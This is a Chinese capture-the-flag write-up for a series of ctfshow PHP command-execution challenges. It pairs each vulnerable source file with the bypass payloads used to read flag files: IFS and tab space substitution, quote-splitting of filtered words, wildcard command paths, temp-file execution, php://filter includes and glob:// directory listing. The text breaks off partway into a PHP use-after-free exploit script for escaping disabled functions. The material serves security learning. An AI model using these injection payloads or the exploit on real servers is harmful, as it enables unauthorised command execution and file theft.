+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517171824-20260228215615-sny462g.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-44"><a href="#web-44" class="headerlink" title="web 44"></a>web 44</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;;|cat|flag&#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>更新了一点</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">?c&#x3D;tac f*||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517172116-20260228215615-swd8u5a.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-45"><a href="#web-45" class="headerlink" title="web 45"></a>web 45</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat|flag| &#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">?c&#x3D;tac%09f*||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517172321-20260228215615-cgndzuv.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+&#x2F;&#x2F;flag in flag.php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
+        include($c.&quot;.php&quot;);
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p><code>php://filter</code>​ <code>php://input</code>​ 应该都用不了，看wp发现 <code>data://</code> 还能用</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;ls&#39;)?&gt;</code></pre>
+
+<p><code>data://text/plain</code>​ 相当于执行了php语句，后面的 <code>.php</code> 就没用了，被当作 html 输出</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517151454-20260228215615-tcj51ty.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-46"><a href="#web-46" class="headerlink" title="web 46"></a>web 46</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*&#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>前面的照用</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;tac%09fl?g.php||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517172710-20260228215615-yw4l4v7.png" alt="image"></p>
+<p>但是 hint 还有一个解法</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">nl&lt;fla&#39;&#39;g.php||</code></pre>
+
+<p>学到了一个新的知识点</p>
+<blockquote>
+<p>使用 <code>*</code>​、<code>?</code>​ 这种通配符，不能使用 <code>&lt;</code>​ 或 <code>&lt;&gt;</code>​ 只有使用类似 <code>fla&#39;&#39;g.php</code> 才能使用这种空格</p>
+</blockquote>
+<p>‍</p>
+<h3 id="web-47"><a href="#web-47" class="headerlink" title="web 47"></a>web 47</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail&#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;tac%09f?ag.php||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517175426-20260228215616-etyc0zd.png" alt="image"></p>
+<h3 id="web-48"><a href="#web-48" class="headerlink" title="web 48"></a>web 48</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;&#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;tac%09fla&#39;&#39;g.php||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517175544-20260228215616-8p12yzv.png" alt="image"></p>
+<h3 id="web-49"><a href="#web-49" class="headerlink" title="web 49"></a>web 49</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;|\%&#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;tac%09fla&#39;&#39;g.php||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517175723-20260228215616-fdudb5z.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-50"><a href="#web-50" class="headerlink" title="web 50"></a>web 50</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;|\%|\x09|\x26&#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>把 <code>%09</code> 给过滤了</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;tac&lt;fla&#39;&#39;g.php||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517175857-20260228215616-p3cgl40.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-51"><a href="#web-51" class="headerlink" title="web 51"></a>web 51</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26&#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>常用的 <code>tac</code> 被过滤了（悲</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;nl&lt;fla&#39;&#39;g.php||
+</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517180109-20260228215616-hasga0y.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-52"><a href="#web-52" class="headerlink" title="web 52"></a>web 52</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p><code>&lt;&gt;</code>​ 被过滤了，但是 <code>$</code>​ 被放出来了，就是使用 <code>$IFS</code></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519094820-20260228215616-ldkoqth.png" alt="image"></p>
+<p>发现是假flag</p>
+<p>发现在根目录还有一个flag</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">ls$IFS&#x2F;||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519094909-20260228215616-0fmfy3d.png" alt="image"></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">nl$IFS&#x2F;fla&#39;&#39;g||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519094951-20260228215616-bh457r8.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-53"><a href="#web-53" class="headerlink" title="web 53"></a>web 53</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
+        echo($c);
+        $d &#x3D; system($c);
+        echo &quot;&lt;br&gt;&quot;.$d;
+    &#125;else&#123;
+        echo &#39;no&#39;;
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>ls 看一眼，发现有一个 <code>readflag</code> 但是好像没什么用</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519095431-20260228215617-4k2s9jj.png" alt="image"></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">nl$&#123;IFS&#125;fla&#39;&#39;g.php</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519100559-20260228215617-kf5334f.png" alt="image"></p>
+<p>直接看就好了</p>
+<p>‍</p>
+<h3 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
+        system($c);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>这里的 <code>nl</code>​ 也被禁用了，并且不允许 <code>fla&#39;&#39;g</code>​ 这种绕过方法，只能用 <code>f???</code> 来绕过</p>
+<p>学到了一个 <code>vi</code>​ 命令，是 <code>vim</code> 的旧版，但是可以输出内容 </p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">vi$&#123;IFS&#125;f???.php</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519101639-20260228215617-u7152w5.png" alt="image"></p>
+<p>hint 还有一个方法</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&#x2F;bin&#x2F;?at$&#123;IFS&#125;f???.php</code></pre>
+
+<p>这个是直接去找 cat 命令的文件路径 <code>/bin/cat</code> 然后再查看</p>
+<p>‍</p>
+<h3 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+&#x2F;&#x2F; 你们在炫技吗？
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
+        system($c);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>这里是把字母过滤了</p>
+<ol>
+<li><p>这里第一个思路是和上一题的 hint 一样的，利用 <code>?</code>​ 去找命令，这里没有过滤数字，所以 <code>base64</code> 这种带有数字的就比较好匹配</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&#x2F;???&#x2F;????64 ????.???</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519103138-20260228215617-c4znq2j.png" alt="image"></p>
+</li>
+<li><p>第二种之前学过一点，利用临时文件上传来绕过<br>因为在 php 中，如果进行文件上传，会保存在 <code>/tmp/phpxxxxxx</code> 中，后面六个字符是随机的大小写字母</p>
+<p>但是如果只用 <code>/???/?????????</code>​ 来匹配会匹配到很多东西，但是因为匹配到的别的文件都不会有大写字母，而这个文件会出现，所以将最后一个设置为大写字母 <code>/???/????????[@-[]</code>​ 用<code>[@-[]</code> 来表示大写字母</p>
+<p>同时在 linux 中，使用 <code>.</code> 可以进行执行</p>
+<p>成功执行</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519104249-20260228215617-g30zhf5.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519104337-20260228215617-hsczqos.png" alt="image"></p>
+</li>
+</ol>
+<p>‍</p>
+<h3 id="web-56"><a href="#web-56" class="headerlink" title="web 56"></a>web 56</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+&#x2F;&#x2F; 你们在炫技吗？
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
+        system($c);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>这题就用上一题的临时文件上传就行</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519143541-20260228215617-d4vrxtd.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h3><blockquote>
+<p><code>命令执行，需要严格的过滤，已测试，可绕</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+&#x2F;&#x2F; 还能炫的动吗？
+&#x2F;&#x2F;flag in 36.php
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\&#96;|\|\#|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\&#x3D;|\[&#x2F;i&quot;, $c))&#123;
+        system(&quot;cat &quot;.$c.&quot;.php&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>这里不是很会，一开始看到没有过滤 <code>$</code>​ 时考虑的是自增运算来绕过，但是 <code>[]</code> 被过滤了，还是不行，看的wp学的</p>
+<blockquote>
+<p>在linux中<br>使用 <code>$(())</code> 代表做一次运算，也就是0</p>
+<p><code>$((~$(())))</code> 对0做取反，值为-1</p>
+<p><code>$(($((~$(())$((~$(())))))</code> 也就是 -1-1，值为-2</p>
+<p><code>$((~$(($((~$(())))$((~$(())))))))</code> 对-2取一次反，得到1</p>
+<p>这里的按位取反有个简单的公式  <code>~x = -(x+1)</code></p>
+</blockquote>
+<p>所以我们只要利用这个特性，获得36就行，因为代码中已经写好 <code>cat</code> 命令了，</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519145645-20260228215618-8q905ak.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519145620-20260228215618-kkrl8o8.png" alt="image"></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></pre>
+
+<p>‍</p>
+<h3 id="web-58"><a href="#web-58" class="headerlink" title="web 58"></a>web 58</h3><blockquote>
+<p><code>命令执行，突破禁用函数</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+&#x2F;&#x2F; 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;]))&#123;
+        $c&#x3D; $_POST[&#39;c&#39;];
+        eval($c);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>应该是配置了一些安全的设置，让函数不能执行，类似 <code>phpinfo()</code>​ 和 <code>system()</code> 都不能使用</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519145939-20260228215618-ej3loo1.png" alt="image"></p>
+<p>这题也学到了几个做法</p>
+<ul>
+<li><p>尝试有什么没有被限制，发现 <code>highlight_file</code> 可以用</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">highlight_file(&#39;flag.php&#39;);</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519150449-20260228215618-woeh8kz.png" alt="image"></p>
+<p>还有之前用过的 <code>show_source()</code> 也可以用</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519150533-20260228215618-4icvrx0.png" alt="image"></p>
+</li>
+<li><p>第二种方法是使用 <code>include()</code> 来使用伪协议</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">c&#x3D;include($_POST[&quot;a&quot;]);&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519150725-20260228215618-2y0oh20.png"></p>
+</li>
+</ul>
+<p>‍</p>
+<h3 id="web-59-65"><a href="#web-59-65" class="headerlink" title="web 59 - 65"></a>web 59 - 65</h3><blockquote>
+<p><code>命令执行，突破禁用函数</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+&#x2F;&#x2F; 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;]))&#123;
+        $c&#x3D; $_POST[&#39;c&#39;];
+        eval($c);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>和上一题完全一样，不知道更新了什么</p>
+<p>‍</p>
+<h3 id="web-66"><a href="#web-66" class="headerlink" title="web 66"></a>web 66</h3><blockquote>
+<p><code>命令执行，突破禁用函数，求你们别秀了</code></p>
+</blockquote>
+<p>终于有点不一样了</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+&#x2F;&#x2F; 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;]))&#123;
+        $c&#x3D; $_POST[&#39;c&#39;];
+        eval($c);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519151820-20260228215618-qmfsl7u.png" alt="image">发现flag的位置改变了</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">print_r(scandir(&quot;&#x2F;&quot;));</code></pre>
+
+<p>这里用这个来读取根目录下有什么<br>因为 <code>scandir()</code>​ 返回的是一个数组，所以要用 <code>print_r()</code> 来打印</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519152149-20260228215618-ud3ftxw.png" alt="image">然后是一样的</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519152214-20260228215619-7y8g1bc.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h3><blockquote>
+<p><code>命令执行，突破禁用函数，求你们别秀了</code></p>
+</blockquote>
+<p>这里的 <code>print_r()</code> 被禁用了</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">var_dump(scandir(&quot;&#x2F;&quot;));</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519152506-20260228215619-z4lj30m.png" alt="image"></p>
+<p>后面一样了</p>
+<p>‍</p>
+<h3 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h3><blockquote>
+<p><code>命令执行，突破禁用函数，求你们别秀了</code></p>
+</blockquote>
+<p>这题直接禁用了 <code>highlight_file()</code> 导致页面一打开就报错（</p>
+<p>应该用的参数是一样的，<code>show_source()</code>​ 也被禁用了，但是 <code>include()</code> 还活着，看源码是一样的</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">c&#x3D;include($_POST[&quot;a&quot;]);&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519152823-20260228215619-cvc8s39.png" alt="image"></p>
+<p>后面的都一样，也是去根目录读</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519152931-20260228215619-2c7ek1z.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69 - 70"></a>web 69 - 70</h3><p><code>var_dump()</code>​ 被禁用了，问ai发现另一个 <code>var_export()</code></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">var_export(scandir(&#39;&#x2F;&#39;));</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519153236-20260228215619-hljb5zt.png" alt="image"></p>
+<p>后面就一样用 <code>include()</code></p>
+<p>‍</p>
+<h3 id="web-71"><a href="#web-71" class="headerlink" title="web 71"></a>web 71</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+error_reporting(0);
+ini_set(&#39;display_errors&#39;, 0);
+&#x2F;&#x2F; 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;]))&#123;
+        $c&#x3D; $_POST[&#39;c&#39;];
+        eval($c);
+        $s &#x3D; ob_get_contents();
+        ob_end_clean();
+        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+
+?&gt;
+
+你要上天吗？</code></pre>
+
+<p>这里的代码会把输出的字母数字全替换为 ? </p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519154007-20260228215619-tbb8vmr.png" alt="image"></p>
+<p>但是如果传入 <code>exit();</code> 就能直接终止后续的操作，就不会影响输出</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519154710-20260228215620-mdf9576.png" alt="image"></p>
+<p>发现读 flag 其实不用伪协议orz</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">include(&#39;&#x2F;flag.txt&#39;);exit();</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519154907-20260228215620-vy83bw1.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-72"><a href="#web-72" class="headerlink" title="web 72"></a>web 72</h3><p>这里发现不能读取根目录的内容，只能读当前目录的东西</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519155209-20260228215620-ogv6xsy.png" alt="image"></p>
+<p>学习了一下，这里是被 <code>open_basedir</code>​ 限制用户访问文件的活动，这里可以使用 <code>glob</code> 伪协议如果，这个查找目录就不会收到限制</p>
+<p>hint 中是这么写的</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">c&#x3D;?&gt;&lt;?php 
+$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);
+foreach($a as $f)
+&#123;
+   echo($f-&gt;__toString().&#39; &#39;);
+&#125;
+exit(0);
+?&gt;</code></pre>
+
+<blockquote>
+<p><code>DirectoryIterator(&quot;glob:// /*&quot;);</code>​ 创建一个新的 <code>DirectoryIterator</code>​ 对象，用来遍历目录，<code>glob:///*</code> 就是用来匹配路径模式</p>
+<p>后面的就是全部输出</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519160023-20260228215620-6z5ywy3.png" alt="image"></p>
+<p>找到了是 flag0.txt 文件，但是 <code>include()</code> 不能用了，要用 uaf 脚本来命令执行，这个</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+function ctfshow($cmd) &#123;
+    global $abc, $helper, $backtrace;
+
+    class Vuln &#123;
+        public $a;
+        public function __destruct() &#123; 
+            global $backtrace; 
+            unset($this-&gt;a);
+            $backtrace &#x3D; (new Exception)-&gt;getTrace();
+            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
+                $backtrace &#x3D; debug_backtrace();
+            &#125;
+        &#125;
+    &#125;
+
